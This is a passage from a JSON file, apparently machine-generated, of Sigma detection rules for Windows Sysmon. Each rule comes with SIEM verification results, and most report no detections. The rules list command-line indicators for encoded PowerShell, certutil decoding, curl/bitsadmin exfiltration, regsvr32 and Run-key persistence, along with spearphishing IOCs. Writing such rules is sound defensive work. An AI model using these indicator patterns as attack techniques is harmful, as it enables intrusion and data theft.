            "rule_id": "0d19eed9-bd0c-4b3b-85da-5a9511781131",
            "attack_id": "ef84e0ad-5994-46cd-9d06-b63b3103b6d0",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 545.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "status": "success",
        "rule": {
          "title": "Create or Modify System Process Persistence via Command-line Tools",
          "description": "Detects creation or modification of system processes used for persistence, such as services, scheduled tasks, or COM registration, by monitoring command-line usage of sc.exe, regsvr32.exe, powershell.exe with encoded commands, schtasks.exe, and wmic.exe.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_sc_create": {
              "Image|endswith": "\\sc.exe",
              "CommandLine|contains": " create "
            },
            "selection_regsvr32": {
              "Image|endswith": "\\regsvr32.exe",
              "CommandLine|contains": "/i"
            },
            "selection_powershell_enc": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": "/create"
            },
            "selection_wmic_service": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": "service"
            },
            "condition": "1 of selection_*"
          },
          "falsepositives": [
            "Legitimate administrative scripts using sc.exe to manage services",
            "Scheduled task creation by IT automation tools (e.g., SCCM, Ansible)",
            "PowerShell -EncodedCommand used by security teams for remote management",
            "Regsvr32.exe invoked by installers to register COM components",
            "Wmic.exe used for legitimate system queries or management"
          ],
          "level": "high",
          "tags": [
            "attack.t1543",
            "attack.persistence",
            "custom.windows",
            "custom.sysmon",
            "custom.process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Create or Modify System Process",
          "generation_method": "langchain",
          "id": "2517cafb-0fd3-4184-bdf2-1af5dfca1148",
          "siem_verification": {
            "rule_id": "2517cafb-0fd3-4184-bdf2-1af5dfca1148",
            "attack_id": "b06751a1-f8f2-44f3-ba98-e036fa97739d",
            "detected": true,
            "events_found": 4,
            "historical_events": 0,
            "query_time_ms": 550.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Execution of cmd.exe with command flag",
          "description": "Detects execution of cmd.exe with command-line flags (e.g., /c or /k) that indicate execution of commands, which aligns with the MITRE ATT&CK Command and Scripting Interpreter technique (T1059).",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe"
            },
            "selection_flag": {
              "CommandLine|contains": "/c"
            },
            "condition": "selection_cmd and selection_flag"
          },
          "falsepositives": [
            "Legitimate administrative scripts run via cmd.exe",
            "Scheduled tasks that invoke cmd.exe for routine maintenance",
            "System processes (e.g., svchost, services.exe) that spawn cmd.exe for legitimate purposes",
            "Windows Update or installer processes that use cmd.exe internally"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "custom.command_and_scripting_interpreter",
            "custom.process_creation",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "36665c17-962e-408c-9905-ff3616811a11",
          "siem_verification": {
            "rule_id": "36665c17-962e-408c-9905-ff3616811a11",
            "attack_id": "d51f3eeb-0258-43ab-8533-df60f0b6e209",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 468.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Scripting",
        "status": "success",
        "rule": {
          "title": "Execution of Scripting Interpreters",
          "description": "Detects execution of common scripting interpreters which may indicate malicious script-based activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe"
            },
            "selection_wscript": {
              "Image|endswith": "\\wscript.exe"
            },
            "selection_cscript": {
              "Image|endswith": "\\cscript.exe"
            },
            "selection_python": {
              "Image|endswith": "\\python.exe"
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "/c"
            },
            "condition": "selection_powershell or selection_wscript or selection_cscript or selection_python or selection_cmd"
          },
          "falsepositives": [
            "Legitimate administrative scripts executed by IT staff",
            "Scheduled tasks or automated maintenance jobs that run PowerShell or Python",
            "System utilities that invoke cmd.exe for routine operations"
          ],
          "level": "medium",
          "tags": [
            "attack.t1059",
            "attack.execution",
            "custom.scripting"
          ],
          "ttp_id": "unknown",
          "technique_name": "Scripting",
          "generation_method": "langchain",
          "id": "271595a1-0007-412f-9076-c7201cdf1450",
          "siem_verification": {
            "rule_id": "271595a1-0007-412f-9076-c7201cdf1450",
            "attack_id": "4e59c000-7172-40f8-9223-f4023694c1a9",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 606.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Scripting",
        "status": "success",
        "rule": {
          "title": "Detect Use of Scripting Interpreters",
          "description": "Detect execution of common scripting interpreters (PowerShell, cscript, wscript, python) which may indicate malicious scripting activity on Windows systems.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "selection_cscript": {
              "Image|endswith": "\\cscript.exe"
            },
            "selection_wscript": {
              "Image|endswith": "\\wscript.exe"
            },
            "selection_python": {
              "Image|endswith": "\\python.exe"
            },
            "condition": "selection_powershell or selection_cscript or selection_wscript or selection_python"
          },
          "falsepositives": [
            "Legitimate administrative scripts executed via PowerShell",
            "System maintenance tasks that use scripting interpreters",
            "Scheduled tasks or services that run scripts as part of normal operation",
            "Developer tools or build pipelines invoking Python or other script engines"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "custom.scripting"
          ],
          "ttp_id": "unknown",
          "technique_name": "Scripting",
          "generation_method": "langchain",
          "id": "e9dc1166-6f65-4b7d-bff9-235897364345",
          "siem_verification": {
            "rule_id": "e9dc1166-6f65-4b7d-bff9-235897364345",
            "attack_id": "938c2568-e04f-45e4-96be-9fa21448dc80",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 698.0000000000001,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "status": "success",
        "rule": {
          "title": "Suspicious Process Injection via Common Windows Utilities",
          "description": "Detects potential process injection activity on Windows systems by monitoring the creation of processes commonly abused for injection (rundll32.exe, powershell.exe, regsvr32.exe) and suspicious parent\u2011child relationships indicative of injection techniques.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\rundll32.exe",
              "CommandLine|contains": ".dll"
            },
            "selection2": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "selection3": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-EncodedCommand"
            },
            "selection4": {
              "Image|endswith": "\\regsvr32.exe",
              "CommandLine|contains": "/i"
            },
            "selection5": {
              "ParentImage|endswith": "\\explorer.exe",
              "Image|endswith": "\\powershell.exe"
            },
            "condition": "selection1 or selection2 or selection3 or selection4 or selection5"
          },
          "falsepositives": [
            "Legitimate administrative scripts that use PowerShell with -EncodedCommand for deployment.",
            "System maintenance tasks that invoke rundll32.exe to load legitimate DLLs.",
            "Software installers or updates that use regsvr32.exe with the /i switch.",
            "User\u2011initiated PowerShell sessions launched from Explorer (e.g., right\u2011click \u2192 Run with PowerShell)."
          ],
          "level": "high",
          "tags": [
            "attack.t1055",
            "custom.process_injection",
            "custom.defense_evasion",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Injection",
          "generation_method": "langchain",
          "id": "5b800ef7-abe7-4926-96f9-dd2976fbbbbf",
          "siem_verification": {
            "rule_id": "5b800ef7-abe7-4926-96f9-dd2976fbbbbf",
            "attack_id": "0051e66b-c6ca-47b6-b864-c44c15a916fd",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 919.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "status": "success",
        "rule": {
          "title": "Suspicious Application Layer Protocol Usage via Command Line",
          "description": "Detects processes that may be used for Command and Control communication over application layer protocols by matching command line patterns indicative of network requests such as encoded PowerShell commands, curl/wget HTTP downloads, BitsAdmin transfers, or Python scripts accessing URLs.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-EncodedCommand"
            },
            "selection_curl": {
              "Image|endswith": "\\curl.exe",
              "CommandLine|contains": "http"
            },
            "selection_wget": {
              "Image|endswith": "\\wget.exe",
              "CommandLine|contains": "http"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "/transfer"
            },
            "selection_python": {
              "Image|endswith": "\\python.exe",
              "CommandLine|contains": "http"
            },
            "condition": "selection_powershell or selection_curl or selection_wget or selection_bitsadmin or selection_python"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell with -EncodedCommand for deployment",
            "System or third\u2011party tools that use curl or wget to download updates or packages",
            "BitsAdmin used by Windows Update or Microsoft Deployment Toolkit",
            "Python scripts that retrieve data from web services as part of normal operations"
          ],
          "level": "high",
          "tags": [
            "attack.t1071",
            "attack.command_and_control",
            "custom.application_layer_protocol",
            "custom.process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Application Layer Protocol",
          "generation_method": "langchain",
          "id": "5bc18ad4-95ed-4940-a535-bcf86933ff56",
          "siem_verification": {
            "rule_id": "5bc18ad4-95ed-4940-a535-bcf86933ff56",
            "attack_id": "15e04357-8d1d-49a0-bff1-73f53c77bcb2",
            "detected": true,
            "events_found": 60,
            "historical_events": 0,
            "query_time_ms": 956.0000000000001,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Suspicious Command-Line Interpreter Execution Detected",
          "description": "Detects execution of command-line interpreters (PowerShell, cmd.exe, wscript.exe, cscript.exe, python.exe) with suspicious flags indicative of malicious activity such as encoded commands, script execution, or network download attempts.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell_enc": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-EncodedCommand"
            },
            "selection_powershell_short": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "/c"
            },
            "selection_wscript": {
              "Image|endswith": "\\wscript.exe",
              "CommandLine|contains": ".js"
            },
            "selection_cscript": {
              "Image|endswith": "\\cscript.exe",
              "CommandLine|contains": ".js"
            },
            "selection_python": {
              "Image|endswith": "\\python.exe",
              "CommandLine|contains": "-c"
            },
            "condition": "selection_powershell_enc or selection_powershell_short or selection_cmd or selection_wscript or selection_cscript or selection_python"
          },
          "falsepositives": [
            "Legitimate administrative scripts executed via PowerShell or cmd.exe",
            "Scheduled tasks or system maintenance jobs that use PowerShell -EncodedCommand for deployment",
            "Automation tools (e.g., Ansible, Chef) that invoke scripts with -c or /c flags",
            "Developers running local scripts for testing purposes"
          ],
          "level": "medium",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "custom.sigma"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "29874848-eafc-49fb-ac4b-6af9db99faed",
          "siem_verification": {
            "rule_id": "29874848-eafc-49fb-ac4b-6af9db99faed",
            "attack_id": "d16b1c73-bcce-4799-b509-9148827919ea",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 515.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "status": "success",
        "rule": {
          "title": "Obfuscated Files or Information via Command Line Flags",
          "description": "Detects usage of obfuscation techniques such as encoded PowerShell commands, certutil decoding, and other suspicious command line flags indicative of the ATT&CK technique T1027 (Obfuscated Files or Information). This rule looks for common obfuscation indicators in process creation events.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "selection2": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-EncodedCommand"
            },
            "selection3": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "IEX"
            },
            "selection4": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": "-decode"
            },
            "selection5": {
              "Image|endswith": "\\rundll32.exe",
              "CommandLine|contains": "javascript:"
            },
            "selection6": {
              "Image|endswith": "\\mshta.exe",
              "CommandLine|contains": "javascript:"
            },
            "selection7": {
              "Image|endswith": "\\regsvr32.exe",
              "CommandLine|contains": "/i"
            },
            "condition": "1 of selection*"
          },
          "falsepositives": [
            "Legitimate administrative scripts that use PowerShell -EncodedCommand for deployment.",
            "System maintenance tasks that invoke certutil.exe with -decode to process certificates.",
            "Authorized use of mshta.exe or rundll32.exe for legitimate scripting or automation.",
            "Regsvr32.exe used by IT teams for registering COM components with the /i switch."
          ],
          "level": "medium",
          "tags": [
            "attack.t1027",
            "attack.defense_evasion",
            "custom.obfuscation",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Obfuscated Files or Information",
          "generation_method": "langchain",
          "id": "aecbc176-09f4-4b2b-b210-8d54dc81b410",
          "siem_verification": {
            "rule_id": "aecbc176-09f4-4b2b-b210-8d54dc81b410",
            "attack_id": "94916816-ad9b-485b-98a5-908014cc08cf",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 1125.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "status": "success",
        "rule": {
          "title": "Detect Potential Exfiltration Over C2 Channel via Command-Line Tools",
          "description": "Detects usage of common command-line utilities (PowerShell, certutil, bitsadmin, curl, wget) with parameters indicative of data exfiltration over a C2 channel.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-EncodedCommand"
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": "-decode"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "/transfer"
            },
            "selection_curl": {
              "Image|endswith": "\\curl.exe",
              "CommandLine|contains": "-X POST"
            },
            "selection_wget": {
              "Image|endswith": "\\wget.exe",
              "CommandLine|contains": "-O"
            },
            "condition": "selection_powershell or selection_certutil or selection_bitsadmin or selection_curl or selection_wget"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell with encoded commands",
            "certutil.exe used for certificate management or decoding files",
            "bitsadmin.exe used for legitimate background file transfers",
            "curl.exe or wget.exe used by administrators for downloading updates or patches"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.t1041",
            "custom.process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration Over C2 Channel",
          "generation_method": "langchain",
          "id": "21ee97f5-0c44-4f71-86c3-bf0ab711391f",
          "siem_verification": {
            "rule_id": "21ee97f5-0c44-4f71-86c3-bf0ab711391f",
            "attack_id": "ea78776b-f90d-4872-a9b0-8efbf426688e",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 716.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "status": "success",
        "rule": {
          "title": "Archive Collected Data via Compression Tools",
          "description": "Detects usage of compression utilities and PowerShell archive commands that may indicate data exfiltration through archiving collected data.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_zip": {
              "Image|endswith": "\\zip.exe",
              "CommandLine|contains": "-r"
            },
            "selection_7z": {
              "Image|endswith": "\\7z.exe"
            },
            "selection_winrar": {
              "Image|endswith": "\\winrar.exe"
            },
            "selection_tar": {
              "Image|endswith": "\\tar.exe"
            },
            "selection_gzip": {
              "Image|endswith": "\\gzip.exe"
            },
            "selection_ps_compress": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Compress-Archive",
                "-c",
                "-Compress",
                "-zip"
              ]
            },
            "selection_cmd_compress": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "zip",
                "tar",
                "gzip",
                "7z"
              ]
            },
            "condition": "selection_zip or selection_7z or selection_winrar or selection_tar or selection_gzip or selection_ps_compress or selection_cmd_compress"
          },
          "falsepositives": [
            "Legitimate backup or deployment scripts that use compression utilities",
            "System administrators creating archives for software packaging",
            "Antivirus or security tools that generate compressed logs"
          ],
          "level": "medium",
          "tags": [
            "attack.t1560",
            "attack.collection",
            "custom.archive",
            "custom.compression",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Archive Collected Data",
          "generation_method": "langchain",
          "id": "94b52f0d-6e57-48e8-8b6d-0d369c2c250b",
          "siem_verification": {
            "rule_id": "94b52f0d-6e57-48e8-8b6d-0d369c2c250b",
            "attack_id": "23f376b2-04e5-4d00-806a-6c62f455e610",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 772.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task/Job",
        "status": "success",
        "rule": {
          "title": "Creation of Scheduled Tasks via Command-Line Tools",
          "description": "Detects creation of Windows Scheduled Tasks using common command-line utilities such as schtasks.exe and PowerShell's Register-ScheduledTask, which are typical indicators of persistence techniques (T1053.005).",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe"
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "Register-ScheduledTask"
            },
            "selection_cmd": {
              "ParentImage|endswith": "\\cmd.exe",
              "CommandLine|contains": "schtasks"
            },
            "condition": "selection_schtasks or selection_powershell or selection_cmd"
          },
          "falsepositives": [
            "Legitimate administrative creation of scheduled tasks (e.g., via Windows Update, backup software, or IT management scripts).",
            "System maintenance scripts that use schtasks.exe or PowerShell to schedule routine tasks.",
            "User-initiated scheduled tasks for personal automation."
          ],
          "level": "medium",
          "tags": [
            "attack.t1053.005",
            "attack.persistence",
            "attack.scheduled_task"
          ],
          "ttp_id": "unknown",
          "technique_name": "Scheduled Task/Job",
          "generation_method": "langchain",
          "id": "6f558c30-eab6-4e57-8e9b-d5d9cc464159",
          "siem_verification": {
            "rule_id": "6f558c30-eab6-4e57-8e9b-d5d9cc464159",
            "attack_id": "870ac9ed-b29a-4801-ac0a-b45a38a01e4f",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 741.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys",
        "status": "success",
        "rule": {
          "title": "Registry Run Keys Persistence via Reg.exe or PowerShell",
          "description": "Detects creation or modification of Registry Run Keys (HKCU or HKLM \\Software\\Microsoft\\Windows\\CurrentVersion\\Run) using reg.exe or PowerShell, indicating potential persistence mechanisms.",
          "logsource": {
            "category": "registry_event",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_reg_hkcu": {
              "Image|endswith": "\\reg.exe",
              "CommandLine|contains": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            },
            "selection_reg_hklm": {
              "Image|endswith": "\\reg.exe",
              "CommandLine|contains": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            },
            "selection_ps_hkcu": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            },
            "selection_ps_hklm": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            },
            "condition": "selection_reg_hkcu or selection_reg_hklm or selection_ps_hkcu or selection_ps_hklm"
          },
          "falsepositives": [
            "Legitimate software installers that add entries to Run keys",
            "System updates or patches modifying Run keys",
            "Antivirus or endpoint protection tools that use Run keys for persistence",
            "Administrative scripts that manage startup programs"
          ],
          "level": "high",
          "tags": [
            "attack.persistence",
            "attack.t1060",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Registry Run Keys",
          "generation_method": "langchain",
          "id": "76d85155-9661-4024-a41b-dc9cf662cd7c",
          "siem_verification": {
            "rule_id": "76d85155-9661-4024-a41b-dc9cf662cd7c",
            "attack_id": "762c2cc2-b538-4b7b-aa0d-f9802daa1bfe",
            "detected": false,
            "events_found": 0,
            "historical_events": 0,
            "query_time_ms": 884.0,
            "status": "success",
            "message": "Verification complete"
          }
        },
        "generation_method": "langchain"
      }
    ],
    "rules": [
      {
        "title": "Detect .NET Assembly Execution via Memory Injection",
        "description": "Detects execution of .NET assemblies that are likely injected into memory, using common Windows utilities such as dotnet.exe, rundll32.exe, and powershell.exe with suspicious command line arguments.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_dotnet": {
            "Image|endswith": "\\dotnet.exe",
            "CommandLine|contains": ".dll"
          },
          "selection_rundll": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": ".dll"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "condition": "selection_dotnet or selection_rundll or selection_powershell"
        },
        "falsepositives": [
          "Legitimate use of dotnet.exe for building or running .NET applications.",
          "System or administrative tasks that invoke rundll32.exe with valid DLLs.",
          "PowerShell scripts that use the -EncodedCommand (-enc) flag for legitimate automation."
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "custom.memory_injection",
          "custom.dotnet",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Execution",
        "generation_method": "langchain",
        "id": "d0f920c5-7de2-43b9-a0ee-9fb3d8410a6b",
        "siem_verification": {
          "rule_id": "d0f920c5-7de2-43b9-a0ee-9fb3d8410a6b",
          "attack_id": "e8eb1e87-4aa3-4812-aeeb-5fa3582c207d",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 846.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Malicious DLL Execution via Rundll32 or Regsvr32 for Persistence",
        "description": "Detects execution of potentially malicious DLLs using rundll32.exe or regsvr32.exe, which are common techniques for establishing persistence on Windows systems.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": ".dll"
          },
          "selection2": {
            "Image|endswith": "\\regsvr32.exe",
            "CommandLine|contains": ".dll"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate use of rundll32.exe by Windows components (e.g., system utilities)",
          "Legitimate use of regsvr32.exe for registering COM components",
          "Software installers that invoke rundll32.exe or regsvr32.exe to register DLLs"
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.t1112"
        ],
        "ttp_id": "unknown",
        "technique_name": "Persistence",
        "generation_method": "langchain",
        "id": "bb716978-9b3e-492a-b514-1115110ead50",
        "siem_verification": {
          "rule_id": "bb716978-9b3e-492a-b514-1115110ead50",
          "attack_id": "eaf86ae7-67bf-4113-b3f3-137f66de592e",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 635.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "PowerShell Execution with Suspicious Command-Line Arguments",
        "description": "Detects execution of PowerShell (powershell.exe) with potentially malicious command-line arguments such as encoded commands or Invoke-Expression, indicating possible abuse of the PowerShell execution technique.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_image": {
            "Image|endswith": "\\powershell.exe"
          },
          "selection_enc": {
            "CommandLine|contains": "-enc"
          },
          "selection_iex": {
            "CommandLine|contains": "Invoke-Expression"
          },
          "condition": "selection_image and (selection_enc or selection_iex)"
        },
        "falsepositives": [
          "Legitimate administrative scripts run via PowerShell",
          "System management tools (e.g., SCCM, Intune) that invoke PowerShell",
          "Windows Update or built\u2011in Windows components that use PowerShell",
          "Security or monitoring agents that execute PowerShell commands"
        ],
        "level": "high",
        "tags": [
          "attack.t1059.001",
          "attack.execution",
          "custom.powershell"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "c425467f-2955-4f40-bec4-cd4759e60ca2",
        "siem_verification": {
          "rule_id": "c425467f-2955-4f40-bec4-cd4759e60ca2",
          "attack_id": "038cd684-c4b3-45c2-8b28-9e0d2e513daf",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 547.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Spearphishing Attachment with Malicious PDF Targeting Colombian Entities",
        "description": "Detects execution of malicious PDF attachments and related command activity associated with spearphishing campaigns targeting Colombian organizations. Includes detection of known malicious PDF hashes, suspicious Office processes spawning command shells, and Outlook usage with compromised email addresses.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "sel_pdf": {
            "Image|endswith": "\\AcroRd32.exe",
            "CommandLine|contains": "Fv3608799004720042L900483000P19878099700001537012.pdf"
          },
          "sel_office_cmd": {
            "Image|endswith": "\\cmd.exe",
            "ParentImage|endswith": "\\WINWORD.exe"
          },
          "sel_office_ps": {
            "Image|endswith": "\\powershell.exe",
            "ParentImage|endswith": "\\WINWORD.exe"
          },
          "sel_outlook_correspondencia": {
            "Image|endswith": "\\OUTLOOK.exe",
            "CommandLine|contains": "correspondencia@ccb.org.co"
          },
          "sel_outlook_alfredo": {
            "Image|endswith": "\\OUTLOOK.exe",
            "CommandLine|contains": "agudelomorenoalfredo79@gmail.com"
          },
          "sel_outlook_cobrofactura": {
            "Image|endswith": "\\OUTLOOK.exe",
            "CommandLine|contains": "cobrofactura09291@gmail.com"
          },
          "sel_hash_md5": {
            "Image|endswith": ".pdf",
            "Hashes|contains": "e4d2799f3001a531d15939b1898399b4"
          },
          "sel_hash_sha256": {
            "Image|endswith": ".pdf",
            "Hashes|contains": "fc85d3da6401b0764a2e8a5f55334a7d683ec20fb8210213feb6148f02a30554"
          },
          "condition": "sel_pdf or sel_office_cmd or sel_office_ps or sel_outlook_correspondencia or sel_outlook_alfredo or sel_outlook_cobrofactura or sel_hash_md5 or sel_hash_sha256"
        },
        "falsepositives": [
          "Legitimate opening of PDF files with AcroRd32.exe",
          "Normal use of Outlook to send emails to internal or external contacts",
          "Office macros that legitimately launch cmd.exe or powershell.exe",
          "Administrative scripts that process PDF files"
        ],
        "level": "high",
        "tags": [
          "attack.t1566.001",
          "attack.initial_access",
          "custom.spearphishing-attachment",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Spearphishing Attachment",
        "generation_method": "langchain",
        "id": "534edaf4-d2d6-43cf-8a77-0f8ecb0d83b8",
        "siem_verification": {
          "rule_id": "534edaf4-d2d6-43cf-8a77-0f8ecb0d83b8",
          "attack_id": "a124ee55-74ed-4ddb-b78b-a9cf56092829",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 526.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Office Document Spawning Command Shells (Phishing)",
        "description": "Detects potential phishing activity where Microsoft Office processes (WINWORD.EXE) spawn command-line interpreters such as cmd.exe or PowerShell, which is a common behavior of malicious macros used in phishing attacks.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_word_cmd": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\cmd.exe"
          },
          "selection_word_ps": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\powershell.exe"
          },
          "selection_ps_enc": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-EncodedCommand"
          },
          "condition": "selection_word_cmd or selection_word_ps or selection_ps_enc"
        },
        "falsepositives": [
          "Legitimate Office macros that automate tasks using PowerShell or cmd.exe",
